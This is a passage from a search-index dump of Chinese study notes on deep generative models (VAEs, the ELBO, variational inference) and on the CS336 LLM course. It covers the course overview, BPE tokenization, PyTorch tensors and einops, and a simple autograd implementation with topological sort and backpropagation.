<p>\u5728\u4e00\u4e9b\u590d\u6742\u7684\u56fe\u50cf\u4e2d\uff0c\u4f8b\u5982\u4eba\u50cf\uff0c\u5176\u4e2d\u603b\u662f\u6709\u5f88\u591a\u7279\u5f81\u53ef\u4ee5\u62bd\u53d6\uff0c\u4f8b\u5982\u53d1\u8272\uff0c\u5e74\u9f84\u7b49\u7b49\uff0c\u4f46\u662f\u6211\u4eec\u6ca1\u6709\u5982\u6b64\u9ad8\u8d28\u91cf\u7684\u6570\u636e\u96c6\u2014\u2014\u540c\u65f6\u5305\u542b\u56fe\u50cf\u548c\u5bf9\u5e94\u7684\u5927\u91cf\u7279\u5f81\u63cf\u8ff0\uff0c\u56e0\u6b64\u8fdb\u884c\u5b66\u4e60\u662f\u6709\u70b9\u56f0\u96be\u7684\uff0c\u6211\u4eec\u5728\u672c\u7ae0\u7684\u505a\u6cd5\u662f\u5c06\u8fd9\u4e9b\u7279\u5f81\u63d0\u53d6\u4e3a\u6f5c\u5728\u53d8\u91cf z</p> <p>\u5176\u5b9e\u63d0\u53d6\u6f5c\u5728\u53d8\u91cf\u5c31\u662fAuto-Encoder\u6240\u505a\u7684\u4e8b\u60c5\uff0c\u901a\u8fc7\u63d0\u53d6\u7684\u7279\u5f81\uff0c\u5f80\u5f80\u4f7f\u5f97\u6211\u4eec\u505a\u5206\u7c7b\u4efb\u52a1\u4e4b\u7c7b\u7684\u66f4\u52a0\u7b80\u5355\u3002</p> <p>\u6f5c\u5728\u53d8\u91cf\u6a21\u578b(Latent variable models)\uff0c\u80fd\u591f\u63a8\u65adunderlying data\u4e2d\u7684\u9690\u85cf\u7ed3\u6784\uff0c\u5f62\u6210\u4e86VAE\u8fd9\u79cd\u5f3a\u5927\u6df1\u5ea6\u751f\u6210\u6a21\u578b</p> <p>\u5728\u6982\u7387\u5b66\u7684\u89d2\u5ea6\u6765\u8bb2\uff0c\u8be5\u6a21\u578b\u7528\u4e8e\u5904\u7406\u89c2\u6d4b\u53d8\u91cf\u548c\u6f5c\u5728\u53d8\u91cf\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u5728\u73b0\u5b9e\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u5f80\u5f80\u65e0\u6cd5\u7a77\u5c3d\u6240\u6709\u7684\u76f8\u5173\u53d8\u91cf\uff0c\u90a3\u4e48\u6211\u4eec\u7528\u6f5c\u5728\u53d8\u91cf\u8868\u8ff0\u6211\u4eec\u65e0\u6cd5\u89c2\u6d4b\u5230\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u5047\u8bbe\u6211\u4eec\u7684\u6f5c\u5728\u53d8\u91cf\u548c\u89c2\u6d4b\u53d8\u91cf\u4e4b\u95f4\u6709\u67d0\u79cd\u53d8\u6362\u5173\u7cfb\u3002</p> \\[ p_{\\theta}(x,z)=p(x|z)p(z) \\] <p>\u5176\u4e2d z is latent variables and x is observed variables</p> <p>\u5728\u73b0\u5b9e\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u6709x\u7684\u6570\u636e\u96c6\u5408\uff0c\u90a3\u4e48\u6211\u4eec\u5e0c\u671b\u83b7\u53d6\u6700\u5408\u9002\u7684x\uff0cz\u7684\u8054\u5408\u5206\u5e03</p> <ul> <li>\u5728\u6211\u4eec\u83b7\u53d6z\u4e4b\u540e\uff0c\u5b66\u4e60\\(p(x|z)\\)\u4f1a\u6bd4\u76f4\u63a5\u5b66\u4e60\\(p(x)\\)\u5bb9\u6613\u5f97\u591a</li> <li>\u5f53\u6211\u4eec\u7684\u6a21\u578b\u5b66\u4e60\u597d\u4e4b\u540e\uff0c\u4e5f\u53ef\u4ee5\u4ecex\u53cd\u63a8z</li> </ul> <p>\u6211\u4eec\u8fd8\u662f\u4f1a\u7528\u795e\u7ecf\u7f51\u7edc\u5efa\u6a21\u7279\u5f81\u7684\u8868\u8fbe</p> <p>\u200b\u200b\u200b</p> <p>\u200d</p> <p>\u5047\u8bbe\u6211\u4eec\u7684\u6a21\u578b\u662f\u7b80\u5355\u7684\u6df7\u5408\u9ad8\u65af\u6a21\u578b\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6570\u636e\u7684\u62df\u5408\u8fd1\u4f3c\u4e8e\u67d0\u79cd\u805a\u7c7b\u5173\u7cfb\uff0c\u6bcf\u4e2a\u9ad8\u65af\u5206\u5e03\u90fd\u7531\u5747\u503c\u548c\u534f\u65b9\u5dee\u63cf\u8ff0\uff0c\u4e2d\u95f4\u7684\u5c0f\u5708\u662f\u5747\u503c\u800c\u534f\u65b9\u5dee\u5927\u6982\u662f\u5c0f\u5708\u7684\u5916\u5ef6</p> <p>\u200b\u200b</p> <p>\u6df7\u5408\u6a21\u578b\u7684\u7ec4\u5408\u662f\u4e00\u79cd\u5f88\u597d\u7684\u63d0\u9ad8\u7684\u8868\u73b0\u529b\u7684\u65b9\u5f0f</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u9ad8\u65af\u6a21\u578b\u4e2d\u7684\u5747\u503c\u548c\u6807\u51c6\u5dee\u90fd\u662f\u7531\u795e\u7ecf\u7f51\u7edc\u8868\u8ff0\u7684\uff0cVAE\u5c31\u662f\u4e00\u4e2a\u65e0\u9650\u7684\u6df7\u5408\u9ad8\u65af\u6a21\u578b\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u795e\u7ecf\u7f51\u7edc\u8868\u8ff0\u8fd9\u6837\u4e00\u4e2a\u6df7\u5408\u9ad8\u65af\u6a21\u578b</p> <p>VAE\u7684\u6982\u7387\u8868\u8ff0\u975e\u5e38\u7b80\u5355</p> \\[ z\\sim\\mathcal{N}(0,1) \\] \\[ p(x|z)=\\mathcal{N}(\\mu_{\\theta}(z),\\sum_{\\theta}(z)) \\] <p>\u4f46\u662f\u4e0a\u8ff0\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u83b7\u53d6x\u7684\u751f\u6210\u6982\u7387\uff0c\u6211\u4eec\u5c31\u9700\u8981\u5bf9z\u6240\u6709\u53ef\u80fd\u7684\u53d6\u503c\u8fdb\u884c\u91c7\u6837\uff08\u56e0\u4e3a\u6211\u4eec\u5e76\u4e0d\u77e5\u9053z\u7684\u5177\u4f53\u503c\uff09\uff0c\u4f46\u662fz\u751a\u81f3\u53ef\u80fd\u5e76\u975e\u4e00\u4e2a\u79bb\u6563\u53d8\u91cf\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u91c7\u7528\u79ef\u5206\u7684\u5f62\u5f0f\uff0c\u4f46\u662f\u8fd9\u79cd\u5f62\u5f0f\u7684\u79ef\u5206\u662f\u975e\u5e38\u6602\u8d35</p> <p>\u5982\u679c\u6211\u4eec\u8fd8\u662f\u91c7\u7528\u6700\u5927\u4f3c\u7136\u5b66\u4e60</p> \\[ \\log \\prod_{x\\in D}p(x,\\theta)=\\sum_{x\\in D}\\log p(x;\\theta)=\\sum_{x\\in D}\\log \\sum_{z}p(x,z;\\theta) \\] <p>\u4e0a\u8ff0\u7684\u8ba1\u7b97\u5728z\u7684\u53d6\u503c\u8fc7\u591a\u7684\u65f6\u5019\u4f1a\u96be\u4ee5\u8ba1\u7b97\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u8003\u8651\u8fd1\u4f3c\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5</p> <ul> <li>\u5c06\u603b\u548c\u7684\u8ba1\u7b97\u8f6c\u6362\u4e3a\u671f\u671b\u7684\u8ba1\u7b97\uff0c\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff0c\u4f46\u662f\u5728\u9ad8\u65af\u5206\u5e03\u7684\u968f\u673a\u91c7\u6837\u4e2d\uff0c\u83b7\u5f97\u7684\\(p_{\\theta}\\)  \u5f80\u5f80\u5f88\u4f4e\uff0c\u65e0\u6cd5\u6709\u6548\u5730\u8868\u793a\u671f\u671b</li> <li>importance sampling\uff0c\u4e0a\u4e00\u4e2a\u65b9\u6cd5\u5728\u5b9e\u8df5\u4e0a\u7684\u95ee\u9898\u5728\u4e0e\u968f\u673a\u91c7\u6837\u5e76\u975e\u4e00\u4e2a\u597d\u7684\u9009\u62e9\uff0c\u8fd9\u6b21\u6211\u4eec\u6362\u4e00\u79cd\u91c7\u6837\u65b9\u6cd5\u518d\u4f7f\u7528\u8499\u7279\u5361\u6d1b\uff0c\u6211\u4eec\u57fa\u4e8e\u67d0\u4e2a\u5206\u5e03\\(q(z)\\)\u8fdb\u884c\u91c7\u6837</li> </ul> <p>\u63a5\u4e0b\u6765\u8fd9\u6bb5\u53d8\u5206\u63a8\u7406\u662fVAE\u7684\u6838\u5fc3\uff0c\u5f53q\u5206\u5e03\u6ee1\u8db3\uff0c\\(q=p(z|x;\\theta)\\) \u65f6\uff0c\u6211\u4eec\u4e0d\u518d\u6d89\u53ca\u5230lower bound\u7684\u90e8\u5206</p> <p>\u200b\u200b</p> <p>\u4ecb\u7ecd\u4e00\u4e0b\u53d8\u5206\u63a8\u7406</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u5047\u8bbe\u6709\u4e00\u4e2a variational family Q \u5176\u5206\u5e03\u8fd1\u4f3c\u4e8e \u6211\u4eec\u96be\u4ee5\u8ba1\u7b97\u7684 \\(p(z|x)\\) </p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u63a8\u5bfc\u4e2d\u6bd4\u8f83\u96be\u61c2\u7684\u4e00\u6b65\u5c31\u662f\u4ece\u79ef\u5206\u8f6c\u6362\u6210\u671f\u671b\uff0c\u56de\u987e\u4e00\u4e0b\u671f\u671b\u7684\u8868\u8fbe\u5f0f</p> \\[ E[g(X)]= \\int_{-\\infty}^{+\\infty}g(x)f_X(x)dx \\] <p>\u6211\u4eec\u5c31\u5047\u8bbe\\(q_{\\lambda}(z)\\)\u662f\\(g(X)\\)\uff0c\u91cc\u9762\u90a3\u4e2alog\u516c\u5f0f\u5c31\u662f\u8868\u8ff0\\(f_X(x)\\)</p> <p>\u800c\u6211\u4eec\u53ef\u4ee5\u8bc1\u660e\uff0c\u4e0a\u8ff0\u76ee\u6807\\(\\log p_{\\theta}(x)\\) \u548c\u6700\u540e\u7684\\(ELBO\\) \u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u7b49\u4e8e\\(q(z)\\)\u548c\u771f\u5b9e\u7684\\(p(z|x)\\) \u7684\u5206\u5e03\u4e4b\u95f4\u7684KL\u6563\u5ea6</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f18\u5316\u8fd9\u4e2aKL\u6563\u5ea6\u6765\u4f7f\u5f97\u4e24\u8005\u5206\u5e03\u63a5\u8fd1\uff0cKL\u6563\u5ea6\u7684\u5b9a\u4e49\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u6700\u540e\u6211\u4eec\u5c06\u6700\u7ec8\u9700\u8981\u4f18\u5316\u7684\u76ee\u6807\u8f6c\u5316\u4e3a\u5982\u4e0b\u516c\u5f0f</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7black box variational inference</p> <p>VAE\u4e0eAE\u5728\u4ee3\u7801\u7ed3\u6784\u4e0a\u6700\u5927\u7684\u53d8\u5316\u5728\u4e8e\uff0cAE\u7684encoder\u751f\u6210\u7684\u662f\u77e9\u9635\uff0c\u800cVAE\u7684encoder\u751f\u6210\u7684\u662f\u6df7\u5408\u9ad8\u65af\u5206\u5e03\u7684\u53c2\u6570</p> \\[ p(x|z)=\\mathcal{N}(u_\\theta(z),\\sum_{\\theta}(z)) \\] <p>decoder \u662f \\(\\theta\\) \u7684\u4f18\u5316\u800cencoder\u662f \\(\\phi\\) \u7684\u4f18\u5316\uff08\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u964d\u4f4ep\u548cq\u4e4b\u95f4\u7684KL\u6563\u5ea6\uff09\uff0c\u4f18\u5316\u7684\u7ed3\u679c\u5982\u4e0b\u56fe\uff0cencoder\u7684\u4f18\u5316\u57fa\u672c\u662f\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u8db3\u591f\u63a5\u8fd1\u7684\u4e0b\u9650\u66f2\u7ebf\uff0c\u800cdecoder\u7684\u4f18\u5316\u5728\u4e8e\u6211\u4eec\u9700\u8981\u627e\u5230\u8fd9\u6761\u4e0b\u9650\u66f2\u7ebf\u4e2d\u6700\u5927\u4f3c\u7136\u7684\u4e0a\u9650</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS236/CS236%20Deep%20Generative%20Models/#5-normalizing-flows","title":"5. normalizing flows","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/","title":"CS336 LLM","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#1-overview-and-tokenizer","title":"1. Overview and tokenizer","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#11-overview","title":"1.1. Overview","text":"<p>\u6982\u8ff0\u90e8\u5206\u5927\u6982\u5206\u4e3a\u4e86\u4e94\u4e2a\u90e8\u5206</p> <p>Basics</p> <p>\u662f\u6307LLM\u4e2d\u6700\u4e3b\u4f53\u7684\u7ed3\u6784</p> <ul> <li>Tokenizer\uff1aBPE</li> <li>Transformer<ul> <li>Activation function</li> <li>Positional encoding</li> <li>Normaliztion</li> <li>Place of Normalization</li> <li>MLP</li> <li>Attention</li> </ul> </li> <li>Training<ul> <li>Optimizer</li> <li>Learning rate</li> <li>Batch size</li> <li>Regularization</li> <li>Hyperparameters</li> </ul> </li> </ul> <p>Systems</p> <ul> <li>Kernel: manage kernels in GPU<ul> <li>Cuda / Triton and so on to write a kernel</li> </ul> </li> <li>Parallelism: manage lots of GPUs<ul> <li>DP PP TP</li> </ul> </li> <li>Inference: not just for chat, but useful for RL(rollout), evaluation<ul> <li>Prefill and decode</li> <li>Kv cache</li> </ul> </li> </ul> <p>Scaling law</p> <ul> <li>Match data and parameters</li> <li>\u7ed9\u5b9a\u6709\u9650\u7684flops\u9884\u7b97\uff0c\u5982\u4f55\u4e00\u6b65\u6b65\u4f18\u5316\u914d\u6bd4</li> </ul> <p>Data</p> <ul> <li>Evaluation design</li> <li>Data curation</li> <li>Data processing</li> </ul> <p>Alignment\uff08post-train\uff09</p> <ul> <li>SFT</li> <li>RL</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#12-tokenizer","title":"1.2. Tokenizer","text":"<p>tokenizer\u7684\u6838\u5fc3\u662f\u628a\u81ea\u7136\u8bed\u8a00\u7684\u4e00\u53e5\u8bdd\u8f6c\u6362\u6210\u6574\u6570\u6570\u7ec4\uff0c\u6570\u7ec4\u91cc\u7684\u6bcf\u4e2a\u6570\u90fd\u6709\u4e00\u4e2a\u8303\u56f4\uff0c\u8fd9\u4e2a\u8303\u56f4\u5373\u662f\u8bcd\u8868\u7684\u5927\u5c0f</p> <ul> <li>\u4e3a\u4ec0\u4e48\u9700\u8981\u6570\u7ec4\uff1a\u56e0\u4e3a\u8ba1\u7b97\u673a\u53ea\u80fd\u5904\u7406\u6570\u5b57</li> <li>\u4e3a\u4ec0\u4e48\u662f\u6574\u6570\uff1a\u56e0\u4e3a\u6587\u5b57\u662f\u79bb\u6563\u7684\uff0c\u6ca1\u6709\u4ec0\u4e48\u5355\u8bcd or \u6c49\u5b57\u4e4b\u95f4\u5b58\u5728\u8fde\u7eed\u5173\u7cfb</li> </ul> <p>\u591a\u79cdtokenizer\u65b9\u6848\u7684\u5bf9\u6bd4</p> <p>\u6700\u540e\u7684\u9009\u62e9\u7ed3\u679c\u662fBPE\uff0cBPE\u7684\u65b9\u6848\u662f\u5148\u6309\u7167\u5b57\u8282\u5206\uff0c\u5206\u5916\u4e4b\u540e\u7528\u8bed\u6599\u53bb\u8bad\u7ec3\uff0c\u5c06\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u8282\u5bf9\u5408\u5e76\u8d77\u6765</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#2-pytorch-basic","title":"2. Pytorch basic","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#21-tensors","title":"2.1. tensors","text":"<p>Pytorch\u7684\u6838\u5fc3\u662ftensor\uff0ctensor\u57fa\u672c\u90fd\u662ffloat32\u7cbe\u5ea6\u7684\uff0c\u4f46\u662f\u7531\u4e8e\u5927\u6a21\u578b\u7684\u8ba1\u7b97\u91cf\u5b9e\u5728\u8fc7\u5927\uff0c\u7531\u6b64\u884d\u751f\u51fa\u4e86\u4e00\u4e9b\u964d\u4f4e\u7cbe\u5ea6\u7684\u65b9\u6848</p> <ul> <li>float16</li> <li>bfloat16</li> <li>fp8</li> </ul> <pre><code> z = torch.zeros(32, 32, device=\"cuda:0\")\n</code></pre> <p>\u5b9e\u9645\u7684tensor\u7684\u5b58\u50a8\u5982\u4e0b</p> <p></p> <p>\u57fa\u672c\u4e0a\u53ea\u8981\u662f\u83b7\u53d6\u67d0\u5757\u8fde\u7eed\u7684\u6570\u636e\uff0c\u5c31\u4e0d\u4f1a\u53d1\u751f\u62f7\u8d1d\uff0c\u5982\u679c\u83b7\u53d6\u7684\u90a3\u5757\u6570\u636e\u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u90a3\u4e48\u6709\u4e9b\u64cd\u4f5c\u5c31\u4f1a\u53d1\u751f\u62f7\u8d1d</p> <p>\u901a\u5e38\u5728Pytorch\u4e2d\u6211\u4eec\u90fd\u4f1a\u6309\u7167batch\u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u4e3a\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u6bd4\u8d77\u5faa\u73af\u8fd9\u6837\u505a\u7684\u5e76\u884c\u6548\u7387\u4f1a\u66f4\u9ad8</p> <pre><code>    x = torch.ones(4, 8, 16, 32)\n    w = torch.ones(32, 2)\n    y = x @ w\n    assert y.size() == torch.Size([4, 8, 16, 2])\n</code></pre> <p>Eniops</p> <p>Eniops\u662fPytorch\u4e2d\u975e\u5e38\u6709\u7528\u7684\u4e00\u4e2a\u6280\u5de7\uff08\u4e00\u4e2a\u5e93\uff09\uff0c\u94fe\u63a5\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u94fe\u63a5</p> <p>Einops tutorial, part 1: basics - Einops</p> <p>\u56e0\u4e3aPytorch\u4e2d\u7ecf\u5e38\u8981\u5bf9tensor\u7684\u7ef4\u5ea6\u505a\u5f88\u591a\u53d8\u6362\uff0c\u6bd4\u5982vit\u4e2d\u7ecf\u5e38\u8981\u7ed9\u56fe\u50cf\u505a\u5206\u5757\uff0cemiops\u53ef\u4ee5\u8f7b\u677e\u5730\u5b9e\u73b0\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u5e76\u4e14\u53ef\u4ee5\u5927\u5927\u589e\u52a0\u53ef\u8bfb\u6027</p> <pre><code>from einops import rearrange\nimport torch\nimages = torch.randn(10, 3, 224, 224)\n# p1=16, p2=16\npatches = rearrange(images, 'b c (h p1) (w p2) -&gt; b (h w) (p1 p2 c)', p1=16, p2=16)\n# patches.shape -&gt; torch.Size([10, 196, 768])\n# 10: batch_size\n# 196: 14*14, number of patches\n# 768: 16*16*3, dimension of each flattened patch\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#22-flops","title":"2.2. Flops","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#23-computational-graph-and-autograd","title":"2.3 Computational Graph and AutoGrad","text":"<p>\u8fd9\u90e8\u5206\u4e0d\u662f336\u4e2d\u7684\uff0c\u662f\u6211\u5728\u81ea\u5b66ML SYS\u4e2d\u5b66\u5230\u7684\u5185\u5bb9\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u6765\u81ea\u4e8eCMU\u7684LLM System\u8bfe\u7a0b\u7684\u4f5c\u4e1a</p> <p>\u8ba1\u7b97\u56fe\uff08\u662f\u4e00\u79cd\u6709\u5411\u65e0\u73af\u56fe\uff09\u7684\u8282\u70b9\u662f\u6570\u636e\uff0c\u8fb9\u662f\u64cd\u4f5c\uff08\u52a0\u51cf\u4e58\u9664\uff0ctanh\u7b49\u7b49\uff09\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8ba1\u7b97\u56fe\u7684\u7ec8\u70b9\u662fLoss\uff0c\u7136\u540e\u6211\u4f1a\u6839\u636eLoss\u6765\u8ba1\u7b97\u62d3\u6251\uff0c\u4e5f\u5c31\u662f\u627e\u5230\u6240\u6709\u5f71\u54cd\u8fd9\u4e2aLoss\u7684\u6570\u636e\u5e76\u6392\u5e8f</p> <pre><code>Input (A)\n     /     \\\n  Op1 (B)  Op2 (C)\n     \\     /\n     Loss (L)\n</code></pre> <p>\u6bd4\u5982\u4e0a\u8ff0\u56fe\uff0c\u6211\u4eec\u57fa\u4e8e\u94fe\u5f0f\u6cd5\u5219\uff0c\u9700\u8981\u5728\u8ba1\u7b97Loss\u5bf9A\u7684\u68af\u5ea6\u4e4b\u524d\uff0c\u5148\u8ba1\u7b97Loss\u5bf9\u4e8eB\u548cC\u7684\u68af\u5ea6\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8fdb\u884c\u62d3\u6251\u6392\u5e8f</p> <p>python\u5f62\u5f0f\u4f2a\u4ee3\u7801</p> <pre><code>def topological_sort(variable: Variable) -&gt; Iterable[Variable]:\n    \"\"\"\n    Computes the topological order of the computation graph.\n\n    Args:\n        variable: The right-most variable\n\n    Returns:\n        Non-constant Variables in topological order starting from the right.\n    \"\"\"\n    from typing import Set\n    order: List[Variable] = []\n    visited: Set[int] = set()\n\n    def dfs(var: Variable):\n        if var.unique_id in visited or var.is_constant():\n            return\n        visited.add(var.unique_id)\n        for parent in var.parents:\n            dfs(parent)\n        order.append(var)\n\n    dfs(variable)\n    return reversed(order)\n</code></pre> <p>\u968f\u540e\u6211\u4eec\u5728\u53cd\u5411\u4f20\u64ad\uff0c\u53cd\u5411\u4f20\u64ad\u4e2d\u6709\u4e24\u4e2a\u64cd\u4f5c\uff0c\u8ba1\u7b97\u68af\u5ea6\u548c\u4f20\u64ad\u68af\u5ea6\uff0c\u6bd4\u5982\u8ba1\u7b97A\u7684\u65f6\u5019\u9700\u8981B\u548cC\u7684\u68af\u5ea6</p> <pre><code>def backpropagate(variable: Variable, deriv: Any) -&gt; None:\n    \"\"\"\n    Runs backpropagation on the computation graph.\n    \"\"\"\n    topo_order = list(topological_sort(variable))\n    derivatives = {variable.unique_id: deriv}\n\n    for var in topo_order:\n        if var.unique_id not in derivatives:\n            continue\n\n        d_var = derivatives[var.unique_id]\n\n        if var.is_leaf():\n            var.accumulate_derivative(d_var)\n        elif not var.is_constant():\n            for parent, d_parent in var.chain_rule(d_var): # chain_rule \u51fd\u6570\u4e2d\u771f\u6b63\u8ba1\u7b97\u68af\u5ea6\uff0c\u4e5f\u5373\u6c42\u504f\u5bfc\n                if parent.unique_id not in derivatives:\n                    derivatives[parent.unique_id] = d_parent\n                else:\n                    derivatives[parent.unique_id] += d_parent\n</code></pre> <p>\u6211\u4eec\u6765\u770b\u770bchain rule\u5185\u90e8\u7684\u5b9e\u73b0</p> <pre><code>    def chain_rule(self, d_output: Any) -&gt; Iterable[Tuple[Variable, Any]]:\n        h = self.history\n        assert h is not None\n        assert h.last_fn is not None\n        assert h.ctx is not None\n\n        x = h.last_fn._backward(h.ctx, d_output) # \u771f\u6b63\u7684\u68af\u5ea6\u8ba1\u7b97\n        assert len(x) == len(h.inputs), f\"Bug in function {h.last_fn}\"\n        return [\n            (inp, inp.expand(self._ensure_tensor(d_in)))\n            for inp, d_in in zip(h.inputs, x)\n        ]\n</code></pre> <p><code>last_fn</code> \u8fd9\u4e2a\u53d8\u91cf\u662f\u6307\u4e00\u4e2a\u64cd\u4f5c\uff0c\u4f8b\u5982\u52a0\u51cf\u4e58\u9664\uff0c\u8fd9\u8fb9\u4f1a\u8c03\u7528 <code>_backward</code> \u65b9\u6cd5\u6765\u8ba1\u7b97\u68af\u5ea6</p> <pre><code>class Add(Function):\n    @staticmethod\n    def forward(ctx: Context, t1: Tensor, t2: Tensor) -&gt; Tensor:\n        return t1.f.add_zip(t1, t2)\n\n    @staticmethod\n    def backward(ctx: Context, grad_output: Tensor) -&gt; Tuple[Tensor, Tensor]:\n        return grad_output, grad_output\n\n\nclass Mul(Function):\n    @staticmethod\n    def forward(ctx: Context, a: Tensor, b: Tensor) -&gt; Tensor:\n        ctx.save_for_backward(a, b)\n        return a.f.mul_zip(a, b)\n\n    @staticmethod\n    def backward(ctx: Context, grad_output: Tensor) -&gt; Tuple[Tensor, Tensor]:\n        a, b = ctx.saved_values\n        return (\n            grad_output.f.mul_zip(b, grad_output),\n            grad_output.f.mul_zip(a, grad_output),\n        )\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u8981\u5728\u8ba1\u7b97\u56fe\u4e2d\u505a\u7b97\u5b50\u878d\u5408\uff0c\u6bd4\u5982Attention\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u8981\u540c\u65f6\u5b9e\u73b0Attention\u64cd\u4f5c\u7684forward\u548cbackward\u64cd\u4f5c\uff0c\u90a3\u4e48\u5176\u8fdb\u5165\u8ba1\u7b97\u56fe\u4e2d\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884cAutoGrad</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#3-architecture","title":"3. Architecture","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#31-architecture-development","title":"3.1 Architecture development","text":"<p>\u5728Architecture\u4e2d\u9996\u5148\u63d0\u5230\u4e86\u5173\u4e8eTransformer\u67b6\u6784\u7684\u90e8\u5206\u8fed\u4ee3\uff0c\u5305\u62ec</p> <ul> <li>Pre-Norm\uff1a\u76f8\u6bd4\u4e8ePostNorm\u4f1a\u8ba9Res Flow\u66f4\u52a0\u6709\u6548</li> <li>RMS-Norm\uff1a\u76f8\u6bd4\u4e8eLayerNorm\u4f1a\u66f4\u52a0\u5feb\u901f</li> <li>Activation function</li> <li>Rope\uff1a\u76f8\u6bd4\u4e8e\u5176\u4ed6\u4f4d\u7f6e\u7f16\u7801\u652f\u6301\u66f4\u5927\u7684\u4e0a\u4e0b\u6587\u8bad\u7ec3</li> </ul> <p>\u4ecb\u7ecd\u4e00\u4e0b\u8fd9\u4e9b\u67b6\u6784\u7684\u5177\u4f53\u5b9e\u73b0</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#32-hyperparameters","title":"3.2 HyperParameters","text":"<p>\u5bf9\u4e8e\u8d85\u53c2\u6570\u7684\u9009\u62e9</p> <ul> <li>FFN size\uff1a\u5bf9\u4e8eRELU MLP\u5c42\uff0c\u4e00\u822chidden layer\u4f1a\u662f\u8f93\u5165\u76844\u500d\uff0c\u8fd9\u4e2ahidden layer\u548cinput layer\u7684\u53c2\u6570\u6bd4\u4e00\u822c\u662f\u7531\u6fc0\u6d3b\u51fd\u6570\u51b3\u5b9a\u7684<ul> <li>\u8fd9\u79cd\u5f80\u5f80\u662f\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53d6\u51b3\u4e8e\u7ecf\u9a8c\u6cd5\u5219\uff0c\u4f46\u662fGoogle\u7684T5\u7b49Model\u7684hidden layer/input layer\u8fdc\u8fdc\u5927\u4e8e4\uff0c\u4f46\u662f\u4ed6\u4eec\u4ecd\u7136\u6709\u6548</li> </ul> </li> </ul> <p></p> <ul> <li>head size\uff1a\u5bf9\u4e8eModel\u7684heads\uff0c\u5b83\u7684Num heads * Head dim \u548c Model dim \uff08\u5c31\u662f\u6bcf\u4e2atoken\u7684\u957f\u5ea6\uff09\u7684\u6bd4\u503c\u5f80\u5f80\u662f1</li> <li>aspect ratio\uff1a\u5bf9\u4e8eModel\u7684\u53c2\u6570\u548c\u6a21\u578b\u7684\u5c42\u6570\u7684\u6bd4\u503c\uff0c\u4e5f\u5373\u6bcf\u5c42\u7684hidden states\uff0c\u4e00\u822c\u5728128\u5de6\u53f3</li> <li>vocabulary size\uff1a\u4e8b\u5b9e\u4e0a\u6765\u8bf4\u4e3a\u4e86\u5e94\u5bf9\u66f4\u591a\u7684\u6a21\u6001\u548c\u8bed\u8a00\uff0cvocabulary 